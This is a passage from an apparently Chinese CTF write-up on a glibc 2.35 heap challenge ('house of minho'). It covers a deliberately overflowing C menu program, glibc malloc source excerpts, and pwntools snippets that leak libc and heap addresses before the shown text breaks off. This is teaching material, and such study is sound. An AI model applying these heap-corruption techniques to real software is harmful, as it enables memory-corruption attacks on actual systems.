class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIZE_SMALL 0x40</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIZE_BIG   0x80</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *g_buf;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getint</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *msg)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> val;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, msg);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%*c&quot;</span>, &amp;val) != <span class=\"number\">1</span>) <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> val;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. new\\n2. show\\n3. delete&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (getint(<span class=\"string\">&quot;&gt; &quot;</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">1</span>: &#123; <span class=\"comment\">/* new */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (g_buf) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] Buffer in use&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getint(<span class=\"string\">&quot;Size [1=small / 2=big]: &quot;</span>) == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">          g_buf = (<span class=\"type\">char</span>*)<span class=\"built_in\">malloc</span>(SIZE_SMALL);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          g_buf = (<span class=\"type\">char</span>*)<span class=\"built_in\">malloc</span>(SIZE_BIG);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data: &quot;</span>);</span><br><span class=\"line\">        read(STDIN_FILENO, g_buf, SIZE_BIG);</span><br><span class=\"line\">        g_buf[<span class=\"built_in\">strcspn</span>(g_buf, <span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">2</span>: &#123; <span class=\"comment\">/* show */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!g_buf) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] Empty buffer&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data: %s\\n&quot;</span>, g_buf);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">3</span>: &#123; <span class=\"comment\">/* delete */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!g_buf) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] Empty buffer&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"built_in\">free</span>(g_buf);</span><br><span class=\"line\">          g_buf = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[+] Bye!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>题面十分的简短，主要实现了三个功能，分别为</p>\n<ol>\n<li>add功能，可以申请<code>malloc(0x80)</code>以及<code>malloc(0x40)</code>，无论申请哪一个，都会<code>read(0, g_buf, 0x80)</code></li>\n<li>show功能，直接打印<code>g_buf</code></li>\n<li>free功能，<code>free(g_buf)</code>之后，清空<code>g_buf</code></li>\n</ol>\n<p>Glibc 版本 为2.35-3.1</p>\n<h1 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h1><p>显而易见，漏洞就在add功能中<code>read(0, g_buf, 0x80)</code>，但是局限十分多</p>\n<ol>\n<li>申请堆块的大小被严格限制，只有0x40和0x80两种申请</li>\n<li>可以保存的堆块仅仅只有一块，也就是如果需要再次malloc，必须先free</li>\n</ol>\n<p>那么会带来什么问题呢？</p>\n<p>首先glibc 2.35已经限制了tcache bin内的chunk不能多malloc一次，也就是如果对应位置的count为0，就不会申请出来，这就否定了直接溢出修改fd导致任意地址申请的方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = malloc(0x40)</span><br><span class=\"line\">free(p)</span><br><span class=\"line\">p = malloc(0x80)</span><br><span class=\"line\">free(p)</span><br><span class=\"line\">p = malloc(0x40) // 重新申请回上述的0x40块</span><br><span class=\"line\">read(0, p, 0x80) // 溢出写入到下方的0x80块的fd，并修改size改小</span><br><span class=\"line\">free(p)</span><br><span class=\"line\">p = malloc(0x80)</span><br><span class=\"line\">free(p) // 由于上文改小了size，那么这里释放的时候就不会进入0x90的管理</span><br><span class=\"line\">p = malloc(0x80) // 此时再次申请，如果低版本的tcache就可以申请出任意地址，但是2.35不行</span><br></pre></td></tr></table></figure>\n\n<p>**上述的做法是行不通的！**上述操作之后，0x90管理的位置count已经为0了，所以下次malloc(0x80)就不会从0x90的tcache取出，无法达成任意地址申请</p>\n<p><img src=\"/p/houseofminho-wp/image-20231117232223970.png\" alt=\"image-20231117232223970\"></p>\n<p>但是上述做法给了一个思路，我们可以通过多次free再次malloc 0x40就可以申请回来第一个堆块，并写入0x80长度，这个溢出很稳定，以及我们可以修改下一个堆块大小，使得绕过tcache多次申请0x90的堆块，那么现在我们需要修改tcachebin管理0x90的count值，使得可以任意地址申请。但是这个很难做到，怎么做呢？请读者继续往下看。</p>\n<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><p>如何泄露libc？如何泄露堆地址？</p>\n<h2 id=\"泄露Libc地址\"><a href=\"#泄露Libc地址\" class=\"headerlink\" title=\"泄露Libc地址\"></a>泄露Libc地址</h2><p>首先我们需要使用House of orange的一个技巧，将Top Chunk的size改小，然后申请一个大的堆块就可以把，Top Chunk放入Unsorted bin内，之后利用溢出覆盖size就可以泄露libc地址了。</p>\n<p>但是这里有一个极大的问题！Top chunk需要对其0x1000，但是已有的堆+0x40或者0x80都不可能对齐0x1000，怎么办？</p>\n<p>这里需要提到在没有setbuf(stdin,0);的情况下，scanf的输入长文本，回调用malloc、realloc、free，其中如果scanf输入数据大小为0x1000，那么会产生一下调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x800</span>);</span><br><span class=\"line\">p = <span class=\"built_in\">realloc</span>(p, <span class=\"number\">0x1000</span>);</span><br><span class=\"line\">p = <span class=\"built_in\">realloc</span>(p, <span class=\"number\">0x2000</span>);</span><br><span class=\"line\"><span class=\"built_in\">free</span>(p)</span><br></pre></td></tr></table></figure>\n\n<p>那么我们就可以完成Top Chunk的攻击了，以下是泄露libc的exp，并修复损坏的size</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br></pre></td></tr></table></figure>\n\n<p>此时堆块的布局如下</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118000114704.png\" alt=\"image-20231118000114704\"></p>\n<p>为何下方有0x10的两个块呢？那就需要了解一下unsortedbin的检查</p>\n<p>在<code>_int_malloc</code>中有这么一串代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          bck = victim-&gt;bk;</span><br><span class=\"line\">          size = chunksize (victim);</span><br><span class=\"line\">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)</span><br><span class=\"line\">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class=\"line\">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class=\"line\">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>总结一下就是</p>\n<ol>\n<li>检查当前unsorted bin内的块<code>size</code>位是不是合法的，是否满足<code>0x10 &lt;= size &lt;= system_mem</code></li>\n<li>检查当前块下物理地址相邻的下一块<code>size</code>是不是合法的，是否满足<code>0x10 &lt;= size &lt;= system_mem</code></li>\n<li>检查物理地址相邻的下一块<code>size</code>的<code>prev_size</code>是否和自己的<code>size</code>相等</li>\n<li>检查当前指针的<code>bck-&gt;fd</code>是否等于自己，以及自己的<code>fd</code>是否是<code>main_arena</code>内的一个特定地址</li>\n<li>最后检查物理地址相邻的下一块的<code>prev_inuse</code>是不是<code>0</code></li>\n</ol>\n<p>那么如果正常逻辑下Top Chunk被free到unsorted bin，说明当前内存应该全部分配完了，如果原封不动直接放到unsorted bin内，就会触发上述第2、3、5的检查不合法或者溢出，所以为了防止这个事情发生，就需要在下方设置两个小哨兵块，A块的作用是满足上述第2、3、5的检查，设置prev_size等关键数据，而<strong>B块的作用是防止A块发生unlink合并</strong>，B块的<code>prev_inuse</code>标志是1，代表A块是使用中，所以不会发生unlink，否则unlink会报错（试想一下，如果没有B块，那么A块没有被使用的，如果申请一个刚好大小为当前unsortbin的块，再释放，那么就会触发向前合并unlink，之后由于A块的fd和bk指针问题，导致程序crash）</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118001409448.png\" alt=\"image-20231118001409448\"></p>\n<p>到这里，我们压一下脑栈，上述的unsorted bin布局，后文会使用到，我们回到泄露上</p>\n<h2 id=\"泄露heap地址\"><a href=\"#泄露heap地址\" class=\"headerlink\" title=\"泄露heap地址\"></a>泄露heap地址</h2><p>泄露heap地址相对简单，直接free当前堆块后，由于tcache bin的fd指针具有<code>REVEAL_PTR</code>的保护，所以Tcache bin的第一块由于fd是0，但是被加密之后会变成<code>0 ^ (heap_adde &gt;&gt; 12)</code>的值，故可以直接泄露堆地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PROTECT_PTR(pos, ptr) \\</span></span><br><span class=\"line\"><span class=\"meta\">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>\n\n<p>泄露并修复的exp如下（当前exp衔接泄露libc的）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">... </span><span class=\"comment\"># 衔接上文泄露libc</span></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 一下两行仅仅作为临时修复，使得堆布局好看一点，正式攻击可以删除</span></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x40</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>))</span><br></pre></td></tr></table></figure>\n\n<p>此时heap地址、Libc地址信息已经收集完毕！我们来看看现在堆长什么样子</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118002652903.png\" alt=\"image-20231118002652903\"></p>\n<p>当前我们可控的堆块已经标注在图中，为啥叫做可控呢？因为由于tcache的原因，以及我们只能拥有一个堆块，所以free malloc交替进行我们只能控制这两个区域内存（？这两个区域内存我们应该如何做文章呢？请读者压一压脑栈继续往下看。）</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118002710057.png\" alt=\"image-20231118002710057\"></p>\n<h1 id=\"利用攻击\"><a href=\"#利用攻击\" class=\"headerlink\" title=\"利用攻击\"></a>利用攻击</h1><p>信息收集终于结束了，堆也变成了不认识的样子，那么我们攻击的入口在哪里呢？</p>\n<h2 id=\"Small-bin-Tcache-bin\"><a href=\"#Small-bin-Tcache-bin\" class=\"headerlink\" title=\"Small bin -&gt; Tcache bin\"></a>Small bin -&gt; Tcache bin</h2><p>答案是<code>Small bin</code>！</p>\n<p>为何选用Small bin呢？阅读源码我们可以知道，Small bin是有机会进入Tcache的，什么时机进入呢？在malloc中如果命中了Small bin某个大小的管理，那么就会将这个大小内的剩下所有块依次取出，放入Tcache内，直至填满Tcache</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (in_smallbin_range (nb))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      idx = smallbin_index (nb);</span><br><span class=\"line\">      bin = bin_at (av, idx);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((victim = last (bin)) != bin)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          bck = victim-&gt;bk;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class=\"line\">\t    malloc_printerr (<span class=\"string\">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class=\"line\">          set_inuse_bit_at_offset (victim, nb);</span><br><span class=\"line\">          bin-&gt;bk = bck;</span><br><span class=\"line\">          bck-&gt;fd = bin;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">\t    set_non_main_arena (victim);</span><br><span class=\"line\">          check_malloced_chunk (av, victim, nb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> USE_TCACHE</span></span><br><span class=\"line\">\t  <span class=\"comment\">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class=\"line\"><span class=\"comment\">\t     stash them in the tcache.  */</span></span><br><span class=\"line\">\t  <span class=\"type\">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (tcache != <span class=\"literal\">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      mchunkptr tc_victim;</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"comment\">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class=\"line\">\t      <span class=\"keyword\">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class=\"line\">\t\t     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t  <span class=\"keyword\">if</span> (tc_victim != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t    &#123;</span><br><span class=\"line\">\t\t      bck = tc_victim-&gt;bk;</span><br><span class=\"line\">\t\t      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class=\"line\">\t\t      <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">\t\t\tset_non_main_arena (tc_victim);</span><br><span class=\"line\">\t\t      bin-&gt;bk = bck;</span><br><span class=\"line\">\t\t      bck-&gt;fd = bin;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t      tcache_put (tc_victim, tc_idx); <span class=\"comment\">// !!!!!! 注意这里 放入了tcache内</span></span><br><span class=\"line\">\t            &#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">          <span class=\"type\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">          alloc_perturb (p, bytes);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>也就是代码中的这个部分，下面代码中，bin就是当前small bin的位置，通过bk索引，反向查找，对于每一个Chunk依次解链，放入了Tcache bin中</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (tc_victim != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">          bck = tc_victim-&gt;bk;</span><br><span class=\"line\">          set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">            set_non_main_arena (tc_victim);</span><br><span class=\"line\">          bin-&gt;bk = bck;</span><br><span class=\"line\">          bck-&gt;fd = bin;</span><br><span class=\"line\">          </span><br><span class=\"line\">          tcache_put (tc_victim, tc_idx); <span class=\"comment\">// !!!!!! 注意这里 放入了tcache内</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>目标明确，那么命中small bin需要先绕过Tcache，也就是当前<code>Tcache[0x90]</code>不能有free的堆块，以及需要一次<code>malloc(0x80)</code>，那么我们伪造的small bin大小也需要是0x90</p>\n<h2 id=\"伪造Small-bin（0x90）可行性讨论\"><a href=\"#伪造Small-bin（0x90）可行性讨论\" class=\"headerlink\" title=\"伪造Small bin（0x90）可行性讨论\"></a>伪造Small bin（0x90）可行性讨论</h2><p>如何伪造一个0x90大小的Small bin呢？进入Small bin可以从Unsorted bin进入，如何进入呢？</p>\n<ol>\n<li>当前Unsorted bin中有一个0x90大小的堆块空闲</li>\n<li>malloc一次大于0x90大小的堆块<code>size &gt;= 0x90 &amp;&amp; malloc(size)</code>，且不能命中Tcache</li>\n</ol>\n<p>条件2比较简单满足，依旧是scanf利用</p>\n<p>对于我们现在的堆块布局来说，我们仅仅只能控制0x90堆块size位（看上文的泄露后堆布局情况图片），这个位置能做什么文章呢？那么答案十分明朗：<strong>伪造Unsorted bin！</strong></p>\n<p>我们先讨论一下，是否可行，我们能溢出可控空间为<code>0x80-0x40=0x40</code>，这个0x40大小的空间包括了下一个堆块的<code>prev_size</code>和<code>size</code>位置，以及堆块内容部分。假设我们能修改上图中0x90堆块的size位置改大，并能成功free，那么就会进入unsorted bin中，<strong>如果此时构造我们无法完成两块小哨兵块的布置</strong>，因为需要如下的布局</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">     | prev_size |  size  |</span><br><span class=\"line\">     +--------------------+</span><br><span class=\"line\">0x00 |           |  0x50  |    </span><br><span class=\"line\">0x10 |           |        |    -- 可控起始位置</span><br><span class=\"line\">     +--------------------+   &lt;- Unsorted bin</span><br><span class=\"line\">0x50 |           |  0x91  |</span><br><span class=\"line\">0x90 |           |        |    </span><br><span class=\"line\">0xD0 |           |        |    -- 可控终止位置</span><br><span class=\"line\">     +--------------------+</span><br><span class=\"line\">0xE0 |           |  0x10  |    -- Chunk A</span><br><span class=\"line\">     +--------------------+</span><br><span class=\"line\">0xF0 |           |  0x11  |    -- Chunk B</span><br><span class=\"line\">     +--------------------+</span><br></pre></td></tr></table></figure>\n\n<p>（可控地址指的是，我们可以通过malloc(0x40)向后写0x80字节，以及malloc(0x80)也能写0x80字节，上面例子也就是总长度可控为<code>0x80*2-0x40=0xC0</code>）</p>\n<p>但是可控空间完全不够布置下面的Chunk AB，要怎么办呢？我们需要可控多长呢？</p>\n<p>在绞尽脑汁几个小时之后，我注意到了我们貌似浪费了0x50堆块中的0x40长度的大小。怎么办呢？</p>\n<h2 id=\"Unlink扩展溢出距离\"><a href=\"#Unlink扩展溢出距离\" class=\"headerlink\" title=\"Unlink扩展溢出距离\"></a>Unlink扩展溢出距离</h2><p>这里我们可以利用Unlink手法，使得Unsorted bin向前合并，首先我们构造如下的布局</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td 